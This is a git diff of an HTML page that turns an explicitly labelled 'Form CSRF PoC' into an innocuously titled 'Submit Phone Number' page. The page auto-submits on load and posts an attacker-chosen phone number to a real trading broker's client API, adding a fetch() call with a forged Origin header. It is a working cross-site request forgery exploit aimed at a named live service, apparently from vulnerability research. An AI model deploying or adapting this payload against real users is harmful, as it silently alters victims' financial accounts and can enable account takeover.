@@ -1,10 +1,48 @@
 <!DOCTYPE html>
 <html lang="en">
-	<body>
-		<h1>Form CSRF PoC</h1>
-		<form method="POST" action="https://my.tickmill.com/api/client/phone-numbers">
-			<input type="hidden" name="{%22countryCode%22:%22+33%22,%22number%22:%22644566201%22,%22isPrimary%22:false}" value="">
-			<input type="submit" value="Submit Request">
-		</form>
-	</body>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Submit Phone Number</title>
+  </head>
+  <body>
+    <form id="phoneForm">
+      <!-- Form fields are hidden since we're using JavaScript to submit the data -->
+      <input type="hidden" name="countryCode" value="+33" />
+      <input type="hidden" name="number" value="634866102" />
+      <input type="hidden" name="isPrimary" value="false" />
+      <input type="submit" value="Submit" />
+    </form>
+
+    <script>
+      // Prevent the default form submission and send data using fetch with JSON content type
+      document.getElementById('phoneForm').onsubmit = function(event) {
+        event.preventDefault(); // Prevent normal form submission
+
+        // Prepare the data as a JavaScript object (which will be converted to JSON)
+        const data = {
+          countryCode: '+33',
+          number: '634866102',
+          isPrimary: false
+        };
+
+        // Send the request using the fetch API with the appropriate headers
+        fetch('https://my.tickmill.com/api/client/phone-numbers', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json', // Ensure the correct content type
+            'Origin': 'https://ahmadzdddd.github.io', // Set the origin header if required
+          },
+          body: JSON.stringify(data) // Convert the JavaScript object to JSON string
+        })
+        .then(response => response.json()) // Parse the JSON response
+        .then(data => console.log('Success:', data)) // Handle success
+        .catch(error => console.error('Error:', error)); // Handle error
+      };
+
+      // Automatically submit the form after the page loads
+      history.pushState('', '', '/');
+      document.getElementById('phoneForm').submit();
+    </script>
+  </body>
 </html>
